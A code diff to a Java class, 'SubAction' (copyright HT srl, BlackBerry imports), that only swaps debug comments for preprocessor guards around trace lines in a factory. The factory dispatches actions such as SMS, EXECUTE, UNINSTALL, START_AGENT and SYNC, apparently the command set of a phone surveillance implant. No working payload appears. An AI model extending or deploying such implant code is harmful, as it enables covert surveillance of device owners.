@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -17,8 +18,9 @@ import blackberry.utils.DebugLevel;
  * The Class SubAction.
  */
 public abstract class SubAction {
-    //#debug
+    //#ifdef DEBUG
     protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE);
+    //#endif
 
     public static final int ACTION = 0x4000;
     public static final int ACTION_SYNC = ACTION + 0x1;
@@ -44,44 +46,54 @@ public abstract class SubAction {
     public static SubAction factory(final int actionId_, final byte[] confParams) {
         switch (actionId_) {
         case ACTION_SYNC:        
-            // #debug debug
-            debug.trace("Factory ACTION_SYNC");
+            //#ifdef DEBUG_TRACE
+            debug.trace("Factory ACTION_SYNC");        
+            //#endif
             return new SyncAction(actionId_, confParams);
         case ACTION_UNINSTALL:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory ACTION_UNINSTALL");
+            //#endif
             return new UninstallAction(actionId_, confParams);
         case ACTION_RELOAD:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory ACTION_RELOAD");
+            //#endif
             return new ReloadAction(actionId_, confParams);
         case ACTION_SMS:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory ACTION_SMS");
+            //#endif
             return new SmsAction(actionId_, confParams);
         case ACTION_TOOTHING:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory ACTION_TOOTHING");
+            //#endif
             return new ToothingAction(actionId_, confParams);
         case ACTION_START_AGENT:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory ACTION_START_AGENT");
+            //#endif
             return new StartAgentAction(actionId_, confParams);
         case ACTION_STOP_AGENT:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory ACTION_STOP_AGENT");
+            //#endif
             return new StopAgentAction(actionId_, confParams);
         case ACTION_SYNC_PDA:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory ACTION_SYNC_PDA");
+            //#endif
             return new SyncPdaAction(actionId_, confParams);
         case ACTION_EXECUTE:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory ACTION_EXECUTE");
+            //#endif
             return new ExecuteAction(actionId_, confParams);
         case ACTION_SYNC_APN:        
-            // #debug debug
-            debug.trace("Factory ACTION_SYNC");
+            //#ifdef DEBUG_TRACE
+            debug.trace("Factory ACTION_SYNC");        
+            //#endif
             return new SyncActionApn(actionId_, confParams);
         default:
             return null;
